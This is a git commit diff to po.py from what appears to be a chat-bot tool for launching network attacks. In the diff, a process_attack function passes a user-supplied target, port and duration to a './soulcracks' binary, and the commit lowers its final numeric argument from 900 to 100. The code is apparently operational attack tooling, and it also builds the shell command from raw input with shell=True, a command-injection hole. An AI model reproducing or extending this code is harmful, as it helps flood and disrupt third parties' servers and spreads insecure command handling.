433e1664e2831f6b94da7daff6d052625df739d6
hhjhhsgdgg <jops4123@gmail.com>
2025-02-08 19:49:26 +0530

    Update po.py

--- po.py
+++ po.py
@@ -84,7 +84,7 @@ def process_attack(message, target, port, time):
     start_attack_reply(message, target, port, time)
     
     # Execute the attack
-    full_command = f"./soulcracks {target} {port} {time} 900"
+    full_command = f"./soulcracks {target} {port} {time} 100"
     try:
         subprocess.run(full_command, shell=True, check=True)
     except subprocess.CalledProcessError:
